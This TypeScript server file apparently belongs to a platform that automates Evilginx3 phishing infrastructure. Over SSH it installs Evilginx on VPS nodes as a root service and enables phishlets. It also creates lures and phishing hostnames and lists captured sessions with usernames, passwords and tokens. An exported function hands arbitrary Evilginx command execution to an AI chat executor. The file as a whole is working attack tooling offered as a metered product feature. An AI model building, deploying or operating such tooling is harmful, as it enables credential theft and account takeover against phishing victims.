/**
 * Evilginx Router — Dedicated VPS Node Architecture
 *
 * Security model:
 *   Evilginx NEVER runs on the Railway Titan Server.
 *   Each Evilginx instance runs on a SEPARATE dedicated VPS with its own IP.
 *   VPS SSH credentials are encrypted per-user in the DB (AES-256).
 *   The Railway app only orchestrates via SSH — it never stores plaintext creds.
 *   Each node gets firewall rules that block inbound reverse connections.
 *   Per-campaign isolation: different phishing campaigns use different nodes.
 *
 * Command execution:
 *   Evilginx3 supports a REST API mode (-developer) that accepts commands via stdin.
 *   We use a heredoc-based approach to pipe commands into evilginx -developer.
 *   For persistent state, evilginx runs as a systemd service.
 *
 * Node lifecycle:
 *   addNode    → save VPS SSH creds to DB (encrypted)
 *   deployNode → SSH into VPS, install Evilginx3, configure systemd service, start
 *   startServer → start the evilginx systemd service
 *   stopServer  → stop the evilginx systemd service
 *   checkNode  → verify Evilginx is installed and service is running
 *   exec       → run any Evilginx command on the active node via stdin pipe
 *   All phishlet/lure/session operations target the active node
 */

import { z } from "zod";
import { router, adminProcedure } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { getUserPlan, enforceFeature, enforceAdminFeature } from "./subscription-gate";
import { consumeCredits } from "./credit-service";
import { getDb } from "./db";
import { userSecrets } from "../drizzle/schema";
import { eq, and } from "drizzle-orm";
import { encrypt, decrypt } from "./fetcher-db";
import { execSSHCommand, type SSHConfig } from "./titan-server";
import { createLogger } from "./_core/logger.js";

const log = createLogger("Evilginx");

const SECRET_NODES  = "__evilginx_nodes";
const SECRET_ACTIVE = "__evilginx_active";

// ─── Install script: Evilginx3 + systemd service + hardened firewall ─────────
const INSTALL_EVILGINX = `#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive

echo '[Titan] Updating packages...'
apt-get update -qq 2>&1 | tail -1

echo '[Titan] Installing dependencies...'
apt-get install -y -qq wget curl git iptables iptables-persistent expect 2>&1 | tail -2

echo '[Titan] Applying firewall (block inbound reverse connections)...'
iptables -F INPUT 2>/dev/null || true
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 53 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j ACCEPT
iptables -A INPUT -j DROP
mkdir -p /etc/iptables
iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
netfilter-persistent save 2>/dev/null || true

echo '[Titan] Installing Evilginx3...'
mkdir -p /opt/evilginx /opt/evilginx/phishlets /opt/evilginx/redirectors
cd /opt/evilginx

ARCH=$(uname -m)
if [ "$ARCH" = "x86_64" ]; then ARCH_TAG="amd64"; else ARCH_TAG="arm64"; fi

LATEST=$(curl -s https://api.github.com/repos/kgretzky/evilginx2/releases/latest 2>/dev/null | grep tag_name | cut -d '"' -f4 || echo 'v3.3.0')
echo "[Titan] Downloading Evilginx $LATEST..."

wget -q "https://github.com/kgretzky/evilginx2/releases/download/\${LATEST}/evilginx_linux_\${ARCH_TAG}.tar.gz" -O evilginx.tar.gz 2>/dev/null || \
  wget -q "https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx_linux_\${ARCH_TAG}.tar.gz" -O evilginx.tar.gz

tar -xzf evilginx.tar.gz --strip-components=1 2>/dev/null || tar -xzf evilginx.tar.gz
chmod +x evilginx 2>/dev/null || chmod +x evilginx3 2>/dev/null || true
BIN=$(find /opt/evilginx -maxdepth 1 -name 'evilginx*' -type f -perm /111 | head -1)
ln -sf "$BIN" /usr/local/bin/evilginx

echo '[Titan] Creating systemd service...'
cat > /etc/systemd/system/evilginx.service << 'SVCEOF'
[Unit]
Description=Evilginx3 Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx
ExecStart=/usr/local/bin/evilginx -p /opt/evilginx/phishlets -c /opt/evilginx -developer
Restart=on-failure
RestartSec=5
StandardInput=null
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl enable evilginx

echo '[Titan] Verifying installation...'
if /usr/local/bin/evilginx -version 2>&1 | grep -qi 'evilginx\\|version\\|v3\\|v2'; then
  PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')
  echo EVILGINX_OK
  echo PUBLIC_IP:$PUBLIC_IP
else
  echo EVILGINX_FAILED
  exit 1
fi
`;

const START_EVILGINX = `systemctl start evilginx 2>/dev/null; sleep 2; systemctl is-active --quiet evilginx && echo EVILGINX_RUNNING || (nohup /usr/local/bin/evilginx -p /opt/evilginx/phishlets -c /opt/evilginx -developer > /var/log/evilginx.log 2>&1 & sleep 2; pgrep evilginx > /dev/null && echo EVILGINX_RUNNING || echo EVILGINX_START_FAILED)`;

const STOP_EVILGINX = `systemctl stop evilginx 2>/dev/null; kill $(pgrep evilginx) 2>/dev/null; sleep 1; echo STOPPED`;

const CHECK_EVILGINX = `PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')
if command -v evilginx > /dev/null 2>&1 || [ -f /usr/local/bin/evilginx ]; then echo INSTALLED; else echo NOT_INSTALLED; fi
if pgrep evilginx > /dev/null 2>&1; then echo RUNNING; else echo NOT_RUNNING; fi
VERSION=$(/usr/local/bin/evilginx -version 2>&1 | grep -oP 'v[0-9]+\\.[0-9]+\\.[0-9]+' | head -1 || echo 'unknown')
echo PUBLIC_IP:$PUBLIC_IP
echo VERSION:$VERSION`;

// ─── Types ────────────────────────────────────────────────────────────────────
export interface EvilginxNode {
  id: string;
  label: string;
  sshHost: string;
  sshPort: number;
  sshUser: string;
  sshPassword?: string;
  sshKey?: string;
  publicIp?: string;
  status: "pending" | "deploying" | "ready" | "running" | "offline" | "error";
  installed: boolean;
  running: boolean;
  version?: string;
  lastChecked?: string;
  country?: string;
  addedAt: string;
  deployedAt?: string;
  errorMessage?: string;
  campaign?: string;
}

// ─── DB helpers ───────────────────────────────────────────────────────────────
async function getNodes(userId: number): Promise<EvilginxNode[]> {
  const db = await getDb();
  if (!db) return [];
  const rows = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_NODES))).limit(1);
  if (!rows.length) return [];
  try { return JSON.parse(decrypt(rows[0].encryptedValue)) as EvilginxNode[]; } catch { return []; }
}

async function saveNodes(userId: number, nodes: EvilginxNode[]): Promise<void> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  const enc = encrypt(JSON.stringify(nodes));
  const ex = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_NODES))).limit(1);
  if (ex.length) {
    await db.update(userSecrets).set({ encryptedValue: enc, updatedAt: new Date() }).where(eq(userSecrets.id, ex[0].id));
  } else {
    await db.insert(userSecrets).values({ userId, secretType: SECRET_NODES, label: "Evilginx Nodes", encryptedValue: enc });
  }
}

async function getActiveNodeId(userId: number): Promise<string | null> {
  const db = await getDb();
  if (!db) return null;
  const rows = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_ACTIVE))).limit(1);
  if (!rows.length) return null;
  try { return decrypt(rows[0].encryptedValue) || null; } catch { return null; }
}

async function setActiveNodeId(userId: number, nodeId: string | null): Promise<void> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  const enc = encrypt(nodeId ?? "");
  const ex = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_ACTIVE))).limit(1);
  if (ex.length) {
    await db.update(userSecrets).set({ encryptedValue: enc, updatedAt: new Date() }).where(eq(userSecrets.id, ex[0].id));
  } else {
    await db.insert(userSecrets).values({ userId, secretType: SECRET_ACTIVE, label: "Active Evilginx Node", encryptedValue: enc });
  }
}

async function getActiveNode(userId: number): Promise<EvilginxNode | null> {
  const activeId = await getActiveNodeId(userId);
  if (!activeId) return null;
  const nodes = await getNodes(userId);
  return nodes.find(n => n.id === activeId) ?? null;
}

function nodeToSSH(n: EvilginxNode): SSHConfig {
  return { host: n.sshHost, port: n.sshPort, username: n.sshUser, password: n.sshPassword, privateKey: n.sshKey };
}

function sanitize(n: EvilginxNode): Omit<EvilginxNode, "sshPassword" | "sshKey"> {
  const { sshPassword: _p, sshKey: _k, ...safe } = n;
  return safe;
}

// ─── Evilginx command execution via SSH stdin pipe ───────────────────────────
// Evilginx3 in -developer mode reads commands from stdin when piped.
// We write the command to a temp file and pipe it in to avoid shell escaping issues.
async function execOnNode(node: EvilginxNode, command: string, timeoutMs = 20000, userId?: number): Promise<string> {
  // Sanitise: strip shell injection characters
  const safeCmd = command.replace(/[`$\\]/g, "");
  // Write command to temp file, pipe into evilginx, capture output
  const tmpFile = `/tmp/eg_cmd_${Date.now()}.txt`;
  const script = [
    `printf '%s\\n' ${JSON.stringify(safeCmd)} > ${tmpFile}`,
    `timeout ${Math.floor(timeoutMs / 1000)} /usr/local/bin/evilginx -p /opt/evilginx/phishlets -c /opt/evilginx -developer < ${tmpFile} 2>&1 || echo "EVILGINX_CMD_DONE"`,
    `rm -f ${tmpFile}`,
  ].join("\n");
  try {
    return await execSSHCommand(nodeToSSH(node), script, timeoutMs + 5000, userId);
  } catch (err: any) {
    const msg = err?.message ?? String(err);
    // Classify the error so tRPC sends a proper HTTP status (not 500)
    if (msg.includes("timed out") || msg.includes("ETIMEDOUT")) {
      throw new TRPCError({ code: "TIMEOUT", message: `Evilginx SSH timed out on "${node.label}": ${msg}` });
    }
    throw new TRPCError({ code: "BAD_REQUEST", message: `Evilginx SSH error on "${node.label}": ${msg}` });
  }
}

/** Public export for Titan AI chat executor */
export async function execEvilginxCommandPublic(command: string, userId: number, timeoutMs = 20000): Promise<string> {
  const node = await getActiveNode(userId);
  if (!node) return "No active Evilginx node. Add and deploy a dedicated VPS node in the Evilginx settings first.";
  if (!node.installed) return `Evilginx is not installed on "${node.label}" yet. Deploy the node first.`;
  return execOnNode(node, command, timeoutMs, userId);
}

// ─── Parse helpers ────────────────────────────────────────────────────────────
function parsePhishletList(raw: string): Array<{ name: string; hostname: string; status: string; isEnabled: boolean; isHidden: boolean }> {
  const lines = raw.split("\n").filter(l => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.toLowerCase().includes("phishlet") || line.startsWith(":") || line.includes("─")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 2) {
      const name = parts[0]?.trim();
      const hostname = parts[1]?.trim() || "";
      const status = parts[2]?.trim()?.toLowerCase() || "disabled";
      if (name && name.length > 0 && /^[a-z0-9_-]+$/i.test(name)) {
        results.push({ name, hostname, status, isEnabled: status === "enabled", isHidden: status === "hidden" });
      }
    }
  }
  return results;
}

function parseLureList(raw: string): Array<{ id: number; phishlet: string; hostname: string; path: string; redirectUrl: string; paused: boolean }> {
  const lines = raw.split("\n").filter(l => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.toLowerCase().includes("lure") || line.startsWith(":") || line.includes("─")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 2) {
      const id = parseInt(parts[0]?.trim());
      if (!isNaN(id)) {
        results.push({
          id,
          phishlet: parts[1]?.trim() || "",
          hostname: parts[2]?.trim() || "",
          path: parts[3]?.trim() || "/",
          redirectUrl: parts[4]?.trim() || "",
          paused: parts[5]?.trim()?.toLowerCase() === "paused",
        });
      }
    }
  }
  return results;
}

function parseSessionList(raw: string): Array<{ id: number; phishlet: string; username: string; password: string; tokens: boolean; remoteAddr: string; createTime: string }> {
  const lines = raw.split("\n").filter(l => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.toLowerCase().includes("session") || line.startsWith(":") || line.includes("─")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 3) {
      const id = parseInt(parts[0]?.trim());
      if (!isNaN(id)) {
        results.push({
          id,
          phishlet: parts[1]?.trim() || "",
          username: parts[2]?.trim() || "",
          password: parts[3]?.trim() || "",
          tokens: parts[4]?.trim()?.toLowerCase() === "captured" || parts[4]?.trim()?.toLowerCase() === "yes",
          remoteAddr: parts[5]?.trim() || "",
          createTime: parts[6]?.trim() || "",
        });
      }
    }
  }
  return results;
}

// ─── Router ───────────────────────────────────────────────────────────────────
export const evilginxRouter = router({

  /** List all Evilginx nodes */
  listNodes: adminProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const nodes = await getNodes(ctx.user.id);
    const activeId = await getActiveNodeId(ctx.user.id);
    return { nodes: nodes.map(sanitize), activeNodeId: activeId };
  }),

  /** Add a new dedicated Evilginx VPS node */
  addNode: adminProcedure
    .input(z.object({
      label: z.string().min(1).max(64),
      sshHost: z.string().min(1),
      sshPort: z.number().int().min(1).max(65535).default(22),
      sshUser: z.string().min(1).default("root"),
      sshPassword: z.string().optional(),
      sshKey: z.string().optional(),
      country: z.string().optional(),
      campaign: z.string().optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      if (!input.sshPassword && !input.sshKey) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "SSH password or private key required." });
      }
      const nodes = await getNodes(ctx.user.id);
      if (nodes.some(n => n.sshHost === input.sshHost && n.sshPort === input.sshPort)) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "Node with this host:port already exists." });
      }
      const node: EvilginxNode = {
        id: crypto.randomUUID(), label: input.label,
        sshHost: input.sshHost, sshPort: input.sshPort, sshUser: input.sshUser,
        sshPassword: input.sshPassword, sshKey: input.sshKey,
        status: "pending", installed: false, running: false,
        country: input.country, campaign: input.campaign,
        addedAt: new Date().toISOString(),
      };
      nodes.push(node);
      await saveNodes(ctx.user.id, nodes);
      const activeId = await getActiveNodeId(ctx.user.id);
      if (!activeId) await setActiveNodeId(ctx.user.id, node.id);
      log.info(`User ${ctx.user.id} added Evilginx node: ${input.label} (${input.sshHost})`);
      return { success: true, node: sanitize(node) };
    }),

  /** Deploy Evilginx3 on a node via SSH — installs binary + systemd service */
  deployNode: adminProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const nodes = await getNodes(ctx.user.id);
      const idx = nodes.findIndex(n => n.id === input.nodeId);
      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      const node = nodes[idx];
      node.status = "deploying";
      await saveNodes(ctx.user.id, nodes);
      try {
        const output = await execSSHCommand(nodeToSSH(node), INSTALL_EVILGINX, 300000, ctx.user.id);
        if (!output.includes("EVILGINX_OK")) {
          node.status = "error";
          node.errorMessage = "Evilginx installation failed. Check SSH credentials and server access.";
          await saveNodes(ctx.user.id, nodes);
          return { success: false, message: node.errorMessage, output };
        }
        const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
        const verMatch = output.match(/VERSION:(\S+)/);
        if (ipMatch) node.publicIp = ipMatch[1];
        if (verMatch) node.version = verMatch[1];
        node.status = "ready"; node.installed = true; node.running = false;
        node.deployedAt = new Date().toISOString();
        node.lastChecked = new Date().toISOString();
        node.errorMessage = undefined;
        await saveNodes(ctx.user.id, nodes);
        return { success: true, publicIp: node.publicIp, message: `Evilginx3 installed on "${node.label}" at ${node.publicIp}. Use Start Server to launch it.`, output };
      } catch (err: any) {
        node.status = "error"; node.errorMessage = err.message;
        await saveNodes(ctx.user.id, nodes);
        return { success: false, message: `Deploy failed: ${err.message}` };
      }
    }),

  /** Start the Evilginx service on the active node */
  startServer: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const nodes = await getNodes(ctx.user.id);
    const activeId = await getActiveNodeId(ctx.user.id);
    const idx = nodes.findIndex(n => n.id === activeId);
    if (idx === -1) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node. Add and deploy a dedicated VPS node first." });
    const node = nodes[idx];
    if (!node.installed) throw new TRPCError({ code: "BAD_REQUEST", message: `Evilginx is not installed on "${node.label}". Deploy the node first.` });
    try {
      const output = await execSSHCommand(nodeToSSH(node), START_EVILGINX, 30000, ctx.user.id);
      const running = output.includes("EVILGINX_RUNNING");
      nodes[idx].running = running;
      nodes[idx].status = running ? "running" : "error";
      nodes[idx].lastChecked = new Date().toISOString();
      if (!running) nodes[idx].errorMessage = "Failed to start Evilginx service. Check /var/log/evilginx.log on the VPS.";
      await saveNodes(ctx.user.id, nodes);
      return { success: running, running, message: running ? `Evilginx started on "${node.label}" (${node.publicIp})` : "Failed to start Evilginx. Check server logs.", output };
    } catch (err: any) {
      nodes[idx].status = "error"; nodes[idx].errorMessage = err.message;
      await saveNodes(ctx.user.id, nodes);
      throw new TRPCError({ code: "BAD_REQUEST", message: `SSH error on "${nodes[idx]?.label ?? "node"}": ${err.message}` });
    }
  }),
  /** Stop the Evilginx service on the active node */
  stopServer: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const nodes = await getNodes(ctx.user.id);
    const activeId = await getActiveNodeId(ctx.user.id);
    const idx = nodes.findIndex(n => n.id === activeId);
    if (idx === -1) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const node = nodes[idx];
    try {
      await execSSHCommand(nodeToSSH(node), STOP_EVILGINX, 15000, ctx.user.id);
      nodes[idx].running = false;
      nodes[idx].status = "ready";
      nodes[idx].lastChecked = new Date().toISOString();
      await saveNodes(ctx.user.id, nodes);
      return { success: true, message: `Evilginx stopped on "${node.label}"` };
    } catch (err: any) {
      throw new TRPCError({ code: "BAD_REQUEST", message: `SSH error stopping Evilginx on "${node.label}": ${err.message}` });
    }
  }),
  /** Check if Evilginx is installed and running on a node */
  checkNode: adminProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const nodes = await getNodes(ctx.user.id);
      const idx = nodes.findIndex(n => n.id === input.nodeId);
      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      const node = nodes[idx];
      try {
        const output = await execSSHCommand(nodeToSSH(node), CHECK_EVILGINX, 15000, ctx.user.id);
        const installed = output.includes("INSTALLED");
        const running = output.includes("RUNNING") && !output.includes("NOT_RUNNING");
        const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
        const verMatch = output.match(/VERSION:(\S+)/);
        if (ipMatch) node.publicIp = ipMatch[1];
        if (verMatch) node.version = verMatch[1];
        node.installed = installed;
        node.running = running;
        node.status = running ? "running" : installed ? "ready" : "offline";
        node.lastChecked = new Date().toISOString();
        await saveNodes(ctx.user.id, nodes);
        return { installed, running, publicIp: node.publicIp, version: node.version, message: running ? `Evilginx running on "${node.label}" at ${node.publicIp}` : installed ? `Installed but not running on "${node.label}"` : `Evilginx not installed on "${node.label}"` };
      } catch (err: any) {
        node.status = "offline"; node.lastChecked = new Date().toISOString();
        await saveNodes(ctx.user.id, nodes);
        return { installed: false, running: false, message: `SSH failed: ${err.message}` };
      }
    }),

  /** Set the active node for all Evilginx operations */
  setActiveNode: adminProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const nodes = await getNodes(ctx.user.id);
      if (!nodes.some(n => n.id === input.nodeId)) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      await setActiveNodeId(ctx.user.id, input.nodeId);
      return { success: true };
    }),

  /** Remove a node */
  removeNode: adminProcedure
    .input(z.object({ nodeId: z.string(), stopFirst: z.boolean().default(true) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const nodes = await getNodes(ctx.user.id);
      const idx = nodes.findIndex(n => n.id === input.nodeId);
      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      const node = nodes[idx];
      if (input.stopFirst && node.installed) {
        try { await execSSHCommand(nodeToSSH(node), STOP_EVILGINX, 10000, ctx.user.id); } catch { /* best-effort */ }
      }
      nodes.splice(idx, 1);
      await saveNodes(ctx.user.id, nodes);
      const activeId = await getActiveNodeId(ctx.user.id);
      if (activeId === input.nodeId) {
        await setActiveNodeId(ctx.user.id, nodes.length > 0 ? nodes[0].id : null);
      }
      return { success: true, message: `Node "${node.label}" removed` };
    }),

  /** Get status of the active node */
  checkInstall: adminProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) return { installed: false, running: false, version: "", path: "", message: "No active node. Add a dedicated VPS node first." };
    try {
      const output = await execSSHCommand(nodeToSSH(node), CHECK_EVILGINX, 15000, ctx.user.id);
      const installed = output.includes("INSTALLED");
      const running = output.includes("RUNNING") && !output.includes("NOT_RUNNING");
      const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
      const verMatch = output.match(/VERSION:(\S+)/);
      return { installed, running, version: verMatch?.[1] ?? (installed ? "3.x" : ""), path: "/usr/local/bin/evilginx", publicIp: ipMatch?.[1], nodeLabel: node.label };
    } catch (err: any) {
      return { installed: false, running: false, version: "", path: "", message: err.message };
    }
  }),

  /** Execute any Evilginx command on the active node */
  exec: adminProcedure
    .input(z.object({ command: z.string().min(1), timeoutMs: z.number().optional() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node. Add and deploy a dedicated VPS node first." });
      if (!node.installed) throw new TRPCError({ code: "BAD_REQUEST", message: `Evilginx not installed on "${node.label}". Deploy the node first.` });
      const output = await execOnNode(node, input.command, input.timeoutMs ?? 20000, ctx.user.id);
      return { output, nodeLabel: node.label, publicIp: node.publicIp };
    }),

  /** List phishlets on the active node */
  listPhishlets: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    if (!node.installed) throw new TRPCError({ code: "BAD_REQUEST", message: "Evilginx not installed. Deploy the node first." });
    const raw = await execOnNode(node, "phishlets", 20000, ctx.user.id);
    return { phishlets: parsePhishletList(raw), raw };
  }),

  enablePhishlet: adminProcedure
    .input(z.object({ name: z.string().min(1) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      try { await consumeCredits(ctx.user.id, "evilginx_action", `Evilginx: enable phishlet ${input.name}`); } catch { /* ignore */ }
      const raw = await execOnNode(node, `phishlets enable ${input.name}`, 20000, ctx.user.id);
      return { output: raw, success: !raw.includes("error") && !raw.includes("FAILED") };
    }),

  disablePhishlet: adminProcedure
    .input(z.object({ name: z.string().min(1) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `phishlets disable ${input.name}`, 20000, ctx.user.id);
      return { output: raw, success: !raw.includes("error") && !raw.includes("FAILED") };
    }),

  hidePhishlet: adminProcedure
    .input(z.object({ name: z.string().min(1) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `phishlets hide ${input.name}`, 20000, ctx.user.id);
      return { output: raw, success: !raw.includes("error") && !raw.includes("FAILED") };
    }),

  setPhishletHostname: adminProcedure
    .input(z.object({ name: z.string().min(1), hostname: z.string().min(1) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `phishlets hostname ${input.name} ${input.hostname}`, 20000, ctx.user.id);
      return { output: raw, success: !raw.includes("error") && !raw.includes("FAILED") };
    }),

  listLures: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const raw = await execOnNode(node, "lures", 20000, ctx.user.id);
    return { lures: parseLureList(raw), raw };
  }),

  createLure: adminProcedure
    .input(z.object({
      phishlet: z.string().min(1),
      hostname: z.string().optional(),
      path: z.string().optional(),
      redirectUrl: z.string().optional(),
      pauseAfterFetch: z.boolean().optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      try { await consumeCredits(ctx.user.id, "evilginx_action", `Evilginx: create lure for ${input.phishlet}`); } catch { /* ignore */ }
      // Create lure
      const createRaw = await execOnNode(node, `lures create ${input.phishlet}`, 20000, ctx.user.id);
      // Extract lure ID from output
      const idMatch = createRaw.match(/\[(\d+)\]/);
      const lureId = idMatch ? parseInt(idMatch[1]) : null;
      // Set optional properties
      if (lureId !== null) {
        if (input.hostname) await execOnNode(node, `lures edit ${lureId} hostname ${input.hostname}`, 10000, ctx.user.id);
        if (input.path) await execOnNode(node, `lures edit ${lureId} path ${input.path}`, 10000, ctx.user.id);
        if (input.redirectUrl) await execOnNode(node, `lures edit ${lureId} redirect_url ${input.redirectUrl}`, 10000, ctx.user.id);
        if (input.pauseAfterFetch) await execOnNode(node, `lures edit ${lureId} pause_after_fetch 1`, 10000, ctx.user.id);
      }
      return { output: createRaw, lureId, success: !createRaw.includes("error") };
    }),

  deleteLure: adminProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `lures delete ${input.id}`, 15000, ctx.user.id);
      return { output: raw, success: !raw.includes("error") };
    }),

  getLureUrl: adminProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `lures get-url ${input.id}`, 15000, ctx.user.id);
      const urlMatch = raw.match(/https?:\/\/\S+/);
      return { url: urlMatch?.[0] ?? null, output: raw };
    }),

  listSessions: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "Evilginx");
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const raw = await execOnNode(node, "sessions", 20000, ctx.user.id);
    return { sessions: parseSessionList(raw), raw };
  }),

  getSession: adminProcedure
